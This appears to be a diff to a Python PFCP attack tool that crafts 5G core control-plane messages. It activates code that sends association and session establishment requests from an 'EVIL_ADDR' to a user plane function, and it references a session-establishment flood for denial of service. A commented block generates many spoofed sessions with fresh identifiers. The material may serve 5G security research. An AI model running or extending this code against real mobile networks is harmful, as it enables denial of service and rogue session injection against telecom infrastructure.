@@ -55,11 +55,13 @@ class Ez_PFCP:
     
     def Build_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
                                             seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1):
+        src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
         dest_port = dest_port or self.dest_port
         seid = seid or self.seid
         seq = self.new_seq()
+        
         
         ie_nodeid = Raw(bytes(IE_NodeId(id_type=0, ipv4=src_addr)))
         ie_fseid = Raw(bytes(IE_FSEID(seid=seid, v4=1, ipv4=src_addr)))
@@ -279,7 +281,16 @@ pfcp_dos_obj.Start_pfcp_session_establishment_flood(reqNbr=1, num_threads=1)
 
 
 # TODO: Utiliser le bon plan d'adresse
-# ezpfcp = Ez_PFCP(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
-# ezpfcp.Send_PFCP_association_setup_req()
-# # ezpfcp.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="10.100.200.66")
-# ezpfcp.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="1.1.2.6")
+ezpfcp = Ez_PFCP(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
+ezpfcp.Send_PFCP_association_setup_req()
+# ezpfcp.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="10.100.200.66")
+ezpfcp.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="1.1.2.6")
+
+
+# pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=True)
+#         for i in range(count):
+#             self.pfcp_association_packet_list.append(pfcp_obj.Build_PFCP_association_setup_req())
+#             self.pfcp_establishment_packet_list.append(pfcp_obj.Build_PFCP_session_establishment_req(
+#                 seid=self.new_seid(), 
+#                 ue_addr=self.new_ue_addr(),
+#                 teid=self.new_teid()))
